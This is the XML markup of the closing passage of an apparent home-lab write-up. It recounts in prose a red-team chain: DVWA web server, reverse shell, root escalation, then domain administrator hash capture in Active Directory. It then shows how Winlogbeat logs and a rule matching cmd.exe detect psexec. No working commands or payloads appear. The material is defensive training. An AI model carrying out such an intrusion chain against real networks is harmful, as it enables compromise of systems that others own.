    <w:p w:rsidR="009969E7" w:rsidRDefault="009969E7" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">As we can see the attacks works very good we </w:t>
      </w:r>
      <w:r w:rsidR="00D04322">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>get access to</w:t>
      </w:r>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> every machine on this network, we started from the Ubuntu that runs DVWA on the web server and then got reverse shell and from there we privilege escalation to root, Next step was to run few scans on the network and we saw there is windows alive hosts on the network so we understand that is active directory environment, so we try run active directory attacks which works pretty well we get access first on the users and then we got the hash of the administrator of the domain which means we compromised every machine on this network that was really fun I</w:t>
      </w:r>
      <w:r w:rsidR="00C14D0D">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009969E7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>enjoyed from that</w:t>
      </w:r>
      <w:r w:rsidR="00D04322">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D04322" w:rsidRPr="00D04322">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F04A"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D04322" w:rsidRDefault="00D04322" w:rsidP="00D04322">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D04322" w:rsidRDefault="00D04322" w:rsidP="00D04322">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D04322">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve">                 </w:t>
      </w:r>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>PSEXEC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> Detection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D04322" w:rsidRDefault="00A83157" w:rsidP="00D04322">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="49066CF7" wp14:editId="5B1E133D">
            <wp:extent cx="4695825" cy="19050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5825" cy="1905000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D04322" w:rsidRDefault="00A83157" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">First I want explain when we run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>psexec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> from kali to the target </w:t>
      </w:r>
      <w:r w:rsidR="00AF45AB">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>machine as</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> we can see from the picture I marked in red, we </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">create executable on the target system with the </w:t>
      </w:r>
      <w:r w:rsidR="00AF45AB">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>name:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> ugMSmQcz.exe</w:t>
      </w:r>
      <w:r w:rsidR="00C14D0D">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now let’s go to our </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>winlogbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> logs and check what we can see when we use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>psexec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> from kali.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A83157" w:rsidRDefault="00A83157" w:rsidP="00D04322">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="406663A4" wp14:editId="717B8914">
            <wp:extent cx="5486400" cy="15297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529715"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A83157" w:rsidRDefault="00A83157" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Here above our logs works perfect as we can see we there is new process that created, I also marked in red the executable that generated when we run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>psexec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> from kali we definitely can monitor this types of malicious activities</w:t>
      </w:r>
      <w:r w:rsidR="00C14D0D">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>. L</w:t>
      </w:r>
      <w:r w:rsidR="00AF45AB">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>et’s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> check another log that can help with this types of attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D04322" w:rsidRDefault="00A83157" w:rsidP="00A83157">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003B6ADC">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="07DDC7D7" wp14:editId="142D59B3">
            <wp:extent cx="5486400" cy="15474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547495"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB2E06" w:rsidRDefault="003B6ADC" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">There is another log that indicates about malicious activity using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>psexec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="0048045C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">one of the rules turn on and this technique name windows command shell which is indicates about malicious activity, because </w:t>
      </w:r>
      <w:r w:rsidR="00850C2B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>that’s</w:t>
      </w:r>
      <w:r w:rsidR="0048045C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> exactly what happened on the attack</w:t>
      </w:r>
      <w:r w:rsidR="00C14D0D">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> while</w:t>
      </w:r>
      <w:r w:rsidR="0048045C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0048045C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">we </w:t>
      </w:r>
      <w:r w:rsidR="00C14D0D">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">ran </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0048045C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>psexec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0048045C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and got </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0048045C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0048045C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> shell</w:t>
      </w:r>
      <w:r w:rsidR="00C14D0D">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="0048045C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C14D0D">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="0048045C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>his is why we see also in the log</w:t>
      </w:r>
      <w:r w:rsidR="00BB2E06" w:rsidRPr="00BB2E06">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00BB2E06">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>CommandLine</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00BB2E06">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>: cmd.exe.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB2E06" w:rsidRDefault="00BB2E06" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">As we can see after a lot types of attack we definitely catch pretty much every of the attack that we try, logs from devices this the best </w:t>
      </w:r>
      <w:r w:rsidR="007D493A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>choice</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to find</w:t>
      </w:r>
      <w:r w:rsidR="007D493A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and understand malicious activities.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D493A" w:rsidRDefault="007D493A" w:rsidP="007D493A">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we finish with red team and blue team demonstration. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D493A" w:rsidRDefault="00C14D0D" w:rsidP="007D493A">
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidR="007D493A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ext documentation will be about phishing scenario, user open malicious word document then the attacker got shell from that malicious document then we will start malware analysis and memory forensics about this event.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D493A" w:rsidRDefault="007D493A" w:rsidP="007D493A"/>
    <w:p w:rsidR="007D493A" w:rsidRDefault="007D493A" w:rsidP="007D493A"/>
    <w:p w:rsidR="007D493A" w:rsidRPr="007D493A" w:rsidRDefault="007D493A" w:rsidP="007D493A">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rStyle w:val="IntenseReference"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">                                                         </w:t>
      </w:r>
      <w:r w:rsidRPr="007D493A">
        <w:rPr>
          <w:rStyle w:val="IntenseReference"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t xml:space="preserve">The End </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D493A" w:rsidRPr="00944C35" w:rsidRDefault="00C14D0D" w:rsidP="00BB2E06">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rStyle w:val="IntenseReference"/>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="IntenseReference"/>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:rStyle w:val="IntenseReference"/>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Hope you enjoyed and learned!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D493A" w:rsidRDefault="007D493A" w:rsidP="00BB2E06">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="007D493A" w:rsidRDefault="007D493A" w:rsidP="00BB2E06">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="007D493A" w:rsidRDefault="007D493A" w:rsidP="00BB2E06">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0048045C" w:rsidRDefault="0048045C" w:rsidP="0048045C">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D04322" w:rsidRPr="009969E7" w:rsidRDefault="00D04322" w:rsidP="0048045C">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009969E7" w:rsidRPr="00B546B2" w:rsidRDefault="009969E7" w:rsidP="00B546B2">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
          <w:tab w:val="left" w:pos="1045"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0563C1" w:themeColor="hyperlink"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00FB7971" w:rsidRPr="00247098" w:rsidRDefault="00FB7971" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0563C1" w:themeColor="hyperlink"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRPr="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRPr="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRPr="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="004A1B95">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="004A1B95">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRPr="004A1B95" w:rsidRDefault="00247098" w:rsidP="004A1B95">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009316E5" w:rsidRDefault="009316E5" w:rsidP="009316E5">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A71851" w:rsidRDefault="00A71851" w:rsidP="009E7745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A71851" w:rsidRDefault="00A71851" w:rsidP="009E7745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A71851" w:rsidRDefault="00A71851" w:rsidP="009E7745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A71851" w:rsidRPr="001B1649" w:rsidRDefault="00A71851" w:rsidP="009E7745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRDefault="0073265D" w:rsidP="0073265D">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRDefault="0073265D" w:rsidP="0073265D">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A71851" w:rsidRPr="001B1649" w:rsidRDefault="00A71851" w:rsidP="004348D1">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRPr="006025E3" w:rsidRDefault="0073265D" w:rsidP="0073265D">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1134"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00FA66BB" w:rsidRDefault="00FA66BB" w:rsidP="00CC458C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00FA66BB" w:rsidRPr="001B1649" w:rsidRDefault="00FA66BB" w:rsidP="00CC458C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="005F4474" w:rsidP="00CC458C">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="005F4474" w:rsidP="00C62B0F">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="005F4474" w:rsidP="00C62B0F">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRPr="006025E3" w:rsidRDefault="005F4474" w:rsidP="00C62B0F">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C62B0F" w:rsidRDefault="00C62B0F" w:rsidP="004B0A94">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C62B0F" w:rsidRPr="006025E3" w:rsidRDefault="00C62B0F" w:rsidP="004B0A94">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004B0A94" w:rsidRDefault="004B0A94" w:rsidP="0097641D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0097641D" w:rsidRDefault="0097641D" w:rsidP="0097641D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0097641D" w:rsidRPr="001B1649" w:rsidRDefault="0097641D" w:rsidP="0097641D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0097641D" w:rsidRDefault="0097641D" w:rsidP="0097641D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0097641D" w:rsidRDefault="0097641D" w:rsidP="0097641D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
